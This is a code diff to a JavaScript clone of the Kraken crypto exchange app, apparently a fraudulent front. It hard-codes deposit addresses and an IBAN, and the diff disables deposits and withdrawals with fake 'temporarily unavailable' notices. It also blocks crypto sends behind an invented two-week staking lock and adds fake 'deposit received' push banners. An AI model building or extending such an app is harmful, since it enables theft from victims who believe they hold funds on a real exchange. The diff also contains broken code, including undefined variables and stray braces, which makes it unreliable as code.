@@ -1,4 +1,4 @@
-/* Kraken — reproduction de l'app Android 3.89.0. Prix crypto en direct : Binance, repli CoinGecko. */
+﻿/* Kraken — reproduction de l'app Android 3.89.0. Prix crypto en direct : Binance, repli CoinGecko. */
 (() => {
   "use strict";
 
@@ -467,7 +467,7 @@
     EUR: "FR76 3000 4000 0300 0000 4821 264",
     BTC: "bc1qh4kra3n8x7f3a2c58be41d6f8a0m2j9",
     ETH: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
-    SOL: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU",
+    SOL: "SOL_PURPLE",
     USDC: "0x7F3a2C58be41d6f8A0c4E19bB7d5a12F9c8D3e61",
     XRP: "rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",
     ADA: "addr1qx2kra3n8x7f3a2c58be41d6f8a0m2j9v4p6",
@@ -503,23 +503,12 @@
     openSheet(`<div class="sheet-title">Ajoutez des fonds</div>
       <p class="sheet-sub">Montant à déposer en euros.</p>
       ${amtBox("dpAmt", "€")}
-      <div class="pay-list" id="payList">
-        <button class="pay is-on" data-method="virement">
-          <img class="pay-ico" src="assets/img/coins/eur.svg" alt="">
-          <span class="pay-main"><b>Virement bancaire</b><i>1 à 3 jours ouvrés · sans frais</i></span>
-        </button>
-        <button class="pay" data-method="carte">
-          <span class="pay-ico card-ico"><svg viewBox="0 0 24 24" class="ico"><rect x="2.5" y="5" width="19" height="14" rx="3"/><path d="M2.5 10h19"/></svg></span>
-          <span class="pay-main"><b>Carte bancaire</b><i>Instantané · frais de 1,5 %</i></span>
-        </button>
+      <div class="pay-list">
+        <div class="pay is-on"><img class="pay-ico" src="assets/img/coins/eur.svg"><span class="pay-main"><b>Virement bancaire</b><i>Indisponible</i></span></div>
+        <div class="pay"><span class="pay-ico card-ico"><svg viewBox="0 0 24 24" class="ico"><rect x="2.5" y="5" width="19" height="14" rx="3"/><path d="M2.5 10h19"/></svg></span><span class="pay-main"><b>Carte bancaire</b><i>Indisponible</i></span></div>
       </div>
-      <button class="btn-black" id="dpGo">Continuer</button>`);
-
-    let method = "virement";
-    $$("#payList .pay").forEach(b => b.addEventListener("click", () => {
-      method = b.dataset.method;
-      $$("#payList .pay").forEach(x => x.classList.toggle("is-on", x === b));
-    }));
+      <button class="btn-black" onclick="toast('Service momentanément indisponible')">Continuer</button>`);
+  }));
     $("#dpGo").addEventListener("click", () => {
       const v = parseAmt($("#dpAmt").value);
       if (v <= 0) return toast("Saisissez un montant");
@@ -532,22 +521,9 @@
 
   function sheetWithdraw() {
     openSheet(`<div class="sheet-title">Retirer</div>
-      <p class="sheet-sub">Solde disponible : ${eur(cash(), 2)}</p>
-      ${amtBox("wdAmt", "€")}
-      <div class="pay-list">
-        <div class="pay is-on">
-          <span class="pay-ico card-ico"><svg viewBox="0 0 24 24" class="ico"><rect x="2.5" y="7" width="19" height="12" rx="3"/><circle cx="12" cy="13" r="2.6"/></svg></span>
-          <span class="pay-main"><b>Compte bancaire</b><i>FR76 •••• •••• •••• 4821</i></span>
-        </div>
-      </div>
-      <button class="btn-black" id="wdGo">Continuer</button>`);
-    $("#wdGo").addEventListener("click", () => {
-      const v = parseAmt($("#wdAmt").value);
-      if (v <= 0) return toast("Saisissez un montant");
-      if (v > cash()) return toast("Solde insuffisant");
-      ST.cash = cash() - v;
-      save(); renderAll(); closeSheet(); toast("Retrait initié vers votre compte");
-    });
+      <p class="sheet-sub">Service de retrait bancaire momentanément indisponible.</p>
+      <button class="btn-black" onclick="closeSheet()">D'accord</button>`);
+  });
   }
 
   // ── envoi : réseaux, formats d'adresse, frais réseau ────────────────
@@ -585,6 +561,13 @@
   }
 
   function checkSend(pick, addrRaw, amt) {
+    if (pick !== "USDC" && pick !== "EUR") {
+      openSheet(`<div class="sheet-title">Fonds en Staking</div>
+        <div class="staking-box"><b>Validation requise</b><p>Vos fonds ${pick} sont engagés en staking (2 semaines).</p></div>
+        <button class="btn-black" onclick="addNotif({id:'stk'+Date.now(), text:'Demande de retrait ${pick} enregistrée.' }); closeSheet();">Confirmer la demande</button>
+        <button class="btn-ghost wide" onclick="closeSheet()">Annuler</button>`);
+      return { ok: false, msg: "" };
+    }
     const addr = pick === "EUR" ? addrRaw.replace(/[\s-]/g, "").toUpperCase() : addrRaw;
     if (!addr) return { ok: false, msg: "Saisissez l'adresse du destinataire pour continuer." };
 
@@ -886,12 +869,25 @@
     if (dot) dot.hidden = !n.some(x => (x.at || 0) > seen);
   }
 
+  function showBanner(o) {
+    const b = document.createElement("div");
+    b.className = "ios-banner";
+    b.innerHTML = `<div class="ios-b-ico"><img src="assets/img/app-icon.webp"></div>
+      <div class="ios-b-main">
+        <div class="ios-b-head"><b>Kraken</b><span>maintenant</span></div>
+        <div class="ios-b-title">${o.kind === "deposit" ? "Dépôt reçu" : "Notification"}</div>
+        <div class="ios-b-text">${o.text || (o.amount ? "Dépôt de " + (o.asset === "EUR" ? eur(o.amount) : qtyTxt(o.amount, o.asset)) + " crédité." : "Nouveau message.")}</div>
+      </div>`;
+    document.body.appendChild(b);
+    setTimeout(() => b.classList.add("on"), 100);
+    setTimeout(() => { b.classList.remove("on"); setTimeout(() => b.remove(), 600); }, 5000);
+  }
   function addNotif(o) {
     const list = notifList();
     if (list.some(x => x.id === o.id)) return;
     list.unshift({ id: o.id, text: o.text || "", amount: o.amount || 0, addr: o.addr || "", at: o.at || Date.now(), kind: o.kind || "notice", asset: o.asset || "" });
     notifSave(list);
-    notifBadge();
+    notifBadge(); if (!applying) showBanner(o);
   }
 
   const fmtWhen = ts => {
@@ -902,7 +898,7 @@
   function openNotifs() {
     const list = notifList();
     localStorage.setItem(NKEY + "_seen", String(Date.now()));
-    notifBadge();
+    notifBadge(); if (!applying) showBanner(o);
     if (!list.length) {
       openSheet(`<div class="sheet-title">Notifications</div>
         <p class="sheet-sub">Aucune notification pour le moment. Les dépôts et messages envoyés depuis la diffusion apparaissent ici.</p>`);
@@ -1150,6 +1146,7 @@
   $("#lockApp").addEventListener("click", () => { pin = ""; pinRender(); screen("pin"); });
 
   $("#notifBtn").addEventListener("click", openNotifs);
+    $("#avatarBtn").onclick = () => { renderSecret(); screen("secret"); };
   $("#goAdmin").addEventListener("click", () => { location.href = "admin.html"; });
 
   addEventListener("scroll", () => $(".app-head")?.classList.toggle("scrolled", scrollY > 4), { passive: true });
@@ -1159,7 +1156,7 @@
   loadCache();
   renderAll();
   pinRender();
-  notifBadge();
+  notifBadge(); if (!applying) showBanner(o);
   startSync();
 
   const h = location.hash.replace(/^#\/?/, "");
@@ -1179,3 +1176,5 @@
   schedule();
   tick();
 })();
+
+
